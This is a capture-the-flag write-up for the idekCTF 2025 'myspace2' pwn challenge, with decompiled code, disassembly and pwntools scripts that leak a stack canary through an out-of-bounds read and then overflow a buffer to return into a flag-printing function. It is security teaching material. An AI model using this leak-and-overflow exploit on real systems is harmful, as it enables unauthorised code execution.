---
title: "myspace2 idekCTF 2025"
description: "My solution to myspace2 which i did even when my team got it in 15 mins after release cuz i was bored and didnt know how to do system-abuse at all because i still need to become orz"
slug: "pwn-idek"
date: "2025-08-05 00:00:00+0000"
image: "cover.png"
categories:
    - "Pwn"
tags: 
weight: 1
---

The rest of the idek pwn kinda hurted my brain (orz vy and nightxade) so I thought this chall might be good practice anyway to touch up on some of the basics. This is the pseudocode from ghidra which i pieced together. Its like the pseudo C ghidra has and I added some comments

```c
void all_friends(char (*top_friends)[8]) {
    int i;
    puts("\nTop Friends List:");
    for (i = 0; i < 8; i++) {
        printf("%d: %s\n", i, top_friends[i]);
    }
    return;
}

void display_friend(char (*top_friends)[8]) {
    long lVar1;
    int iVar2;
    long in_FS_OFFSET;
    char buf[16];

    lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    puts("\nEnter index to display (0-7): ");
    fgets(buf, 0x10, stdin);
    iVar2 = FUN_00401160(buf); // atoi
    if ((iVar2 < 0) || (7 < iVar2)) {
        puts("Invalid index!");
    } else {
        write(1, top_friends[iVar2], 8);
        puts("");
    }
    if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}


void edit_friend(char (*top_friends)[8]) {
    long lVar1;
    int iVar2;
    size_t sVar3;
    long in_FS_OFFSET;
    char buf[32];

    lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    puts("\nEnter index to edit (0-7): ");
    fgets(buf, 0x20, stdin);
    iVar2 = FUN_00401160(buf);
    if ((iVar2 < 0) || (7 < iVar2)) {
        puts("Invalid index!");
    } else {
        puts("Enter new name: ");
        fgets(top_friends[iVar2], 0x100, stdin);
        sVar3 = strcspn(top_friends[iVar2], "\n");
        top_friends[iVar2][sVar3] = '\0';
        puts("Friend updated.");
    }
    if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}

void get_flag(void) {
    long lVar1;
    long in_FS_OFFSET;
    char *args [3];
  
    lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    args[0] = "/bin/cat";
    args[1] = "/flag.txt";
    args[2] = (char *)0x0;
    execve("/bin/cat",args,(char **)0x0);
    if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}

void ignore_me(void) {
    setbuf(stdin,(char *)0x0);
    setbuf(stdout,(char *)0x0);
    setbuf(stderr,(char *)0x0);
    return;
}

void menu(void) {
    puts("\n1. See Top Friends");
    puts("2. Edit Friend");
    puts("3. Display Friend");
    puts("4. Quit");
    puts(">> ");
    return;
}

int main(void) {
    long lVar1;
    int iVar2;
    long in_FS_OFFSET;
    char top_friends[8][8]; // 8x8 mat of chars. Each row contains up to 8 chars for the name, multiple of these rows are stored for each name. Kind of funny
    char buf[40];

    lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    setvbuf(stdout, (char *)0x0, 2, 0);
    puts("I really miss MySpace. At least the part about ranking my friends. Let's recreate it!");
    builtin_strncpy(top_friends[0], "es3n1n", 7);
    top_friends[0][7] = '\0';
    builtin_strncpy(top_friends[1], "Zero", 5);
    top_friends[1][5] = '\0';
    top_friends[1][6] = '\0';
    top_friends[1][7] = '\0';
    builtin_strncpy(top_friends[2], "Contron", 8);
    builtin_strncpy(top_friends[3], "mixy1", 6);
    top_friends[3][6] = '\0';
    top_friends[3][7] = '\0';
    builtin_strncpy(top_friends[4], "JoshL", 6);
    top_friends[4][6] = '\0';
    top_friends[4][7] = '\0';
    builtin_strncpy(top_friends[5], "Giapppp", 8);
    builtin_strncpy(top_friends[6], "Icesfont", 8);
    builtin_strncpy(top_friends[7], "arcticx", 8);

LAB_00401636: // main menu routine
    menu();
    fgets(buf, 0x28, stdin);
    iVar2 = FUN_00401160(buf);
    if (iVar2 == 4) {
        if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
            return 0;
        }
        __stack_chk_fail();
    }
    if (iVar2 < 5) {
        if (iVar2 == 3) {
            display_friend(top_friends);
            goto LAB_00401636;
        }
        if (iVar2 < 4) {
            if (iVar2 == 1) {
                all_friends(top_friends);
            } else {
                if (iVar2 != 2) goto LAB_004016cd;
                edit_friend(top_friends);
            }
            goto LAB_00401636;
        }
    }
LAB_004016cd:
    puts("Invalid option.");
    goto LAB_00401636;
}
```

interesting things to note:
- the character count check is absolutely useless for options 2 and 3. The logic gate `((iVar2 < 0) || (7 < iVar2))` does technically work as control flow so this is very confusing

I look at the disassembly of the `edit_friend` function, i see:

```asm
Dump of assembler code for function display_friend:
   0x00000000004014d7 <+0>:     endbr64
   0x00000000004014db <+4>:     push   rbp
   0x00000000004014dc <+5>:     mov    rbp,rsp
   0x00000000004014df <+8>:     sub    rsp,0x40
   0x00000000004014e3 <+12>:    mov    QWORD PTR [rbp-0x38],rdi
   0x00000000004014e7 <+16>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004014f0 <+25>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004014f4 <+29>:    xor    eax,eax
   0x00000000004014f6 <+31>:    lea    rax,[rip+0xbcb]        # 0x4020c8
   0x00000000004014fd <+38>:    mov    rdi,rax
   0x0000000000401500 <+41>:    call   0x4010d0 <puts@plt>
   0x0000000000401505 <+46>:    mov    rdx,QWORD PTR [rip+0x2b64]        # 0x404070 <stdin@GLIBC_2.2.5>
   0x000000000040150c <+53>:    lea    rax,[rbp-0x20]
   0x0000000000401510 <+57>:    mov    esi,0x10
   0x0000000000401515 <+62>:    mov    rdi,rax
   0x0000000000401518 <+65>:    call   0x401130 <fgets@plt>
   0x000000000040151d <+70>:    lea    rax,[rbp-0x20]
   0x0000000000401521 <+74>:    mov    rdi,rax
   0x0000000000401524 <+77>:    call   0x401160 <atoi@plt>
   0x0000000000401529 <+82>:    mov    DWORD PTR [rbp-0x24],eax
   0x000000000040152c <+85>:    cmp    DWORD PTR [rbp-0x24],0x0
   0x0000000000401530 <+89>:    js     0x401538 <display_friend+97>
   0x0000000000401532 <+91>:    cmp    DWORD PTR [rbp-0x24],0x7
   0x0000000000401536 <+95>:    jle    0x401547 <display_friend+112>
   0x0000000000401538 <+97>:    lea    rax,[rip+0xb55]        # 0x402094
   0x000000000040153f <+104>:   mov    rdi,rax
   0x0000000000401542 <+107>:   call   0x4010d0 <puts@plt>
   0x0000000000401547 <+112>:   mov    eax,DWORD PTR [rbp-0x24]
   0x000000000040154a <+115>:   cdqe
   0x000000000040154c <+117>:   lea    rdx,[rax*8+0x0]
   0x0000000000401554 <+125>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000401558 <+129>:   add    rax,rdx
   0x000000000040155b <+132>:   mov    edx,0x8
   0x0000000000401560 <+137>:   mov    rsi,rax
   0x0000000000401563 <+140>:   mov    edi,0x1
   0x0000000000401568 <+145>:   call   0x4010e0 <write@plt>
   0x000000000040156d <+150>:   nop
   0x000000000040156e <+151>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401572 <+155>:   sub    rax,QWORD PTR fs:0x28
   0x000000000040157b <+164>:   je     0x401582 <display_friend+171>
   0x000000000040157d <+166>:   call   0x4010f0 <__stack_chk_fail@plt>
   0x0000000000401582 <+171>:   leave
   0x0000000000401583 <+172>:   ret
End of assembler dump.
```

in the assembly of the control flow here

```asm
0x0000000000401532 <+91>:    cmp    DWORD PTR [rbp-0x24],0x7
0x0000000000401536 <+95>:    jle    0x401547 <display_friend+112>
0x0000000000401538 <+97>:    lea    rax,[rip+0xb55]        # 0x402094
0x000000000040153f <+104>:   mov    rdi,rax
0x0000000000401542 <+107>:   call   0x4010d0 <puts@plt>
0x0000000000401547 <+112>:   mov    eax,DWORD PTR [rbp-0x24]
0x000000000040154a <+115>:   cdqe
0x000000000040154c <+117>:   lea    rdx,[rax*8+0x0]
0x0000000000401554 <+125>:   mov    rax,QWORD PTR [rbp-0x38]
0x0000000000401558 <+129>:   add    rax,rdx
0x000000000040155b <+132>:   mov    edx,0x8
0x0000000000401560 <+137>:   mov    rsi,rax
0x0000000000401563 <+140>:   mov    edi,0x1
0x0000000000401568 <+145>:   call   0x4010e0 <write@plt>
```

there is a jump for the index in range `jle    0x401547` for jumping if the index is less than or equal to 7 but there is actually no jump or ret made if the index is greater... meaning it still performs the stuff inside the else but with an index greater than 7. so i can write to a higher index. What this means though is that positionallly, 8x8 matrix is 64 bytes so after that, any index i choose will increase that offset by 8 bytes. Because `write()` has an fd to stdout, it prints the element at that position thus making a "display" feature. If i know the canary's alignment in the stack now i can continue with the exploit. I honestly just spammed random numbers in hopes of finding a suffix which ended with `00` since thats usually the standard convention for canaries but i guess like if you look at the disassembly for main:

```asm
Dump of assembler code for function main:
   0x0000000000401584 <+0>:     endbr64
   0x0000000000401588 <+4>:     push   rbp
   0x0000000000401589 <+5>:     mov    rbp,rsp
   0x000000000040158c <+8>:     add    rsp,0xffffffffffffff80
   0x0000000000401590 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401599 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040159d <+25>:    xor    eax,eax
   0x000000000040159f <+27>:    mov    rax,QWORD PTR [rip+0x2aba]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x00000000004015a6 <+34>:    mov    ecx,0x0
   0x00000000004015ab <+39>:    mov    edx,0x2
   0x00000000004015b0 <+44>:    mov    esi,0x0
   0x00000000004015b5 <+49>:    mov    rdi,rax
   0x00000000004015b8 <+52>:    call   0x401150 <setvbuf@plt>
   0x00000000004015bd <+57>:    lea    rax,[rip+0xb24]        # 0x4020e8
   0x00000000004015c4 <+64>:    mov    rdi,rax
   0x00000000004015c7 <+67>:    call   0x4010d0 <puts@plt>
   0x00000000004015cc <+72>:    movabs rax,0x6e316e337365
   0x00000000004015d6 <+82>:    mov    QWORD PTR [rbp-0x70],rax
   0x00000000004015da <+86>:    mov    QWORD PTR [rbp-0x68],0x6f72655a
   0x00000000004015e2 <+94>:    movabs rax,0x6e6f72746e6f43
   0x00000000004015ec <+104>:   mov    QWORD PTR [rbp-0x60],rax
   0x00000000004015f0 <+108>:   movabs rax,0x317978696d
   0x00000000004015fa <+118>:   mov    QWORD PTR [rbp-0x58],rax
   0x00000000004015fe <+122>:   movabs rax,0x4c68736f4a
   0x0000000000401608 <+132>:   mov    QWORD PTR [rbp-0x50],rax
   0x000000000040160c <+136>:   movabs rax,0x70707070616947
   0x0000000000401616 <+146>:   mov    QWORD PTR [rbp-0x48],rax
   0x000000000040161a <+150>:   movabs rax,0x746e6f6673656349
   0x0000000000401624 <+160>:   mov    QWORD PTR [rbp-0x40],rax
   0x0000000000401628 <+164>:   movabs rax,0x78636974637261
   0x0000000000401632 <+174>:   mov    QWORD PTR [rbp-0x38],rax
   0x0000000000401636 <+178>:   mov    eax,0x0
   0x000000000040163b <+183>:   call   0x401305 <menu>
   0x0000000000401640 <+188>:   mov    rdx,QWORD PTR [rip+0x2a29]        # 0x404070 <stdin@GLIBC_2.2.5>
   0x0000000000401647 <+195>:   lea    rax,[rbp-0x30]
   0x000000000040164b <+199>:   mov    esi,0x28
   0x0000000000401650 <+204>:   mov    rdi,rax
   0x0000000000401653 <+207>:   call   0x401130 <fgets@plt>
   0x0000000000401658 <+212>:   lea    rax,[rbp-0x30]
   0x000000000040165c <+216>:   mov    rdi,rax
   0x000000000040165f <+219>:   call   0x401160 <atoi@plt>
   0x0000000000401664 <+224>:   mov    DWORD PTR [rbp-0x74],eax
   0x0000000000401667 <+227>:   cmp    DWORD PTR [rbp-0x74],0x4
   0x000000000040166b <+231>:   je     0x4016b7 <main+307>
   0x000000000040166d <+233>:   cmp    DWORD PTR [rbp-0x74],0x4
   0x0000000000401671 <+237>:   jg     0x4016cd <main+329>
   0x0000000000401673 <+239>:   cmp    DWORD PTR [rbp-0x74],0x3
   0x0000000000401677 <+243>:   je     0x4016a9 <main+293>
   0x0000000000401679 <+245>:   cmp    DWORD PTR [rbp-0x74],0x3
   0x000000000040167d <+249>:   jg     0x4016cd <main+329>
   0x000000000040167f <+251>:   cmp    DWORD PTR [rbp-0x74],0x1
   0x0000000000401683 <+255>:   je     0x40168d <main+265>
   0x0000000000401685 <+257>:   cmp    DWORD PTR [rbp-0x74],0x2
   0x0000000000401689 <+261>:   je     0x40169b <main+279>
   0x000000000040168b <+263>:   jmp    0x4016cd <main+329>
   0x000000000040168d <+265>:   lea    rax,[rbp-0x70]
   0x0000000000401691 <+269>:   mov    rdi,rax
   0x0000000000401694 <+272>:   call   0x40135b <all_friends>
   0x0000000000401699 <+277>:   jmp    0x4016dc <main+344>
   0x000000000040169b <+279>:   lea    rax,[rbp-0x70]
   0x000000000040169f <+283>:   mov    rdi,rax
   0x00000000004016a2 <+286>:   call   0x4013be <edit_friend>
   0x00000000004016a7 <+291>:   jmp    0x4016dc <main+344>
   0x00000000004016a9 <+293>:   lea    rax,[rbp-0x70]
   0x00000000004016ad <+297>:   mov    rdi,rax
   0x00000000004016b0 <+300>:   call   0x4014d7 <display_friend>
   0x00000000004016b5 <+305>:   jmp    0x4016dc <main+344>
   0x00000000004016b7 <+307>:   mov    eax,0x0
   0x00000000004016bc <+312>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004016c0 <+316>:   sub    rdx,QWORD PTR fs:0x28
   0x00000000004016c9 <+325>:   je     0x4016e6 <main+354>
   0x00000000004016cb <+327>:   jmp    0x4016e1 <main+349>
   0x00000000004016cd <+329>:   lea    rax,[rip+0xa6a]        # 0x40213e
   0x00000000004016d4 <+336>:   mov    rdi,rax
   0x00000000004016d7 <+339>:   call   0x4010d0 <puts@plt>
   0x00000000004016dc <+344>:   jmp    0x401636 <main+178>
   0x00000000004016e1 <+349>:   call   0x4010f0 <__stack_chk_fail@plt>
   0x00000000004016e6 <+354>:   leave
   0x00000000004016e7 <+355>:   ret
End of assembler dump.
```
i know that the canary is likely loaded in `0x00000000004016bc <+312>:   mov    rdx,QWORD PTR [rbp-0x8]` because right after this instruction there is a `0x00000000004016c0 <+316>:   sub    rdx,QWORD PTR fs:0x28` instruction and stack check fail call which happens after a comparing of values. It makes sure that the value is the same through subtracting the expected value and all. `fgets()` entry is at `[rbp-0x30]` meaning alignment wise its above the matrix. The beginning is `0x70` so the distance betwween them both is 40 but this indexing is relative to the beginning of the matrix. So its `40+64` which is `104` or basically "index 13".

simple canary capture

basically tldr canary is a value in the stack which when overwritten makes the program just crash out. Its a security protection which is supposed to stop buffer overflow attacks this way. Alas, like many protections it gets absolutely screwed over if leaks exist.

```py
#!/usr/bin/python3
from pwn import *
context.arch = "amd64"
context.os = "linux"

elf = ELF('./myspace2')
io = process('./myspace2')

io.recvuntil(b"> ")
io.sendline(b"3")
io.recvuntil(b": ")
io.sendline(b"13")
io.recvline()
io.recvline()
leak = io.recvn(8)
canary = u64(leak)
print(f"canary: {hex(canary)}")
```

```
[*] '/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process './myspace2': pid 12602
canary: 0x51426e6fa1175900
[*] Stopped process './myspace2' (pid 12602)
```

the `00` suffix is there so yea canary. Now i can bof in peace


now ->
- i overflow and i bypass canary
- theres conventiently a get_flag function. i ret to there.
- i exit cuz i need the ret to pop the top of the stack and jmp (top of the stack is addr of get flag)

so then i can finish the final script where the last order of business was just to do a simple bof with canary alignment, and then exit to leverage ret.

```py
#!/usr/bin/python3
from pwn import *
context.arch = "amd64"
context.os = "linux"
local = False

elf = ELF('./myspace2')
io = process('./myspace2')

if not local:
    io = remote("myspace2.chal.idek.team", 1337)

io.recvuntil(b"> ")
io.sendline(b"3")
io.recvuntil(b": ")
io.sendline(b"13")
io.recvline()
io.recvline()
leak = io.recvn(8)
canary = u64(leak)
print(f"canary: {hex(canary)}")

payload = b'A' * 48 + p64(canary) + b'B' * 8
payload += p64(elf.symbols['get_flag'])

io.recvuntil(b"> ")
io.sendline("2")
io.recvuntil(b": ")
io.sendline("7")
io.recvuntil(b": ")
io.sendline(payload)
io.sendline(b"4")

io.interactive()
```

yay

```
[*] '/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Starting local process './myspace2': pid 13557
[+] Opening connection to myspace2.chal.idek.team on port 1337: Done
canary: 0xa9a39f5714d96d00
/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("2")
/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("7")
[*] Switching to interactive mode

Friend updated.

1. See Top Friends
2. Edit Friend
3. Display Friend
4. Quit
>> 
idek{b4bys_1st_c00k1e_leak_yayyy!}
```

fladg